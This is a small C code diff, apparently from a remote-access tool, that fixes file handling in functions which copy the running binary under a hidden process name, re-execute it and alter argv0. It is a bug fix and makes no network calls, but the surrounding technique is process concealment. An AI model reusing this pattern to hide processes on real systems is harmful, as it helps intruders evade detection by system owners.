@@ -130,18 +130,22 @@ try_memexecme(int src, char *argv[]) {
 static int
 try_cpexecme(const char *dir, int src, char *argv[]) {
 	int dst = -1;
+	int ret;
 
 	char fn[512];
 	snprintf(fn, sizeof fn, "%s/%s", dir, gopt.proc_hiddenname);
 	if ((dst = open(fn, O_WRONLY | O_CREAT | O_CLOEXEC, S_IRWXU)) < 0)
 		return -1;
 
-	if (cpy(dst, src) == 0) {
+	ret = cpy(dst, src);
+	// Must close() before execv or -ETXTBSY
+	XCLOSE(dst);
+
+	if (ret == 0) {
 		setenv("_GS_DELME", fn, 1);
 		execv(fn, argv);
 		unsetenv("_GS_DELME");
 	}
-	XCLOSE(dst);
 	// HERE: ERROR: cpy() or execv() failed.
 	unlink(fn);
 
@@ -417,7 +421,7 @@ try_changeargv0(int argc, char *argv[]) {
 			// /proc/self/exe will always fail if O_LARGEFILE is called. Thus
 			// test-open and fall back to argv0
 			int fd;
-			if ((fd = open(myself_exe, O_RDONLY)) >= 0) {
+			if ((fd = open("/proc/self/exe", O_RDONLY)) >= 0) {
 				myself_exe = "/proc/self/exe";
 				close(fd);
 			}
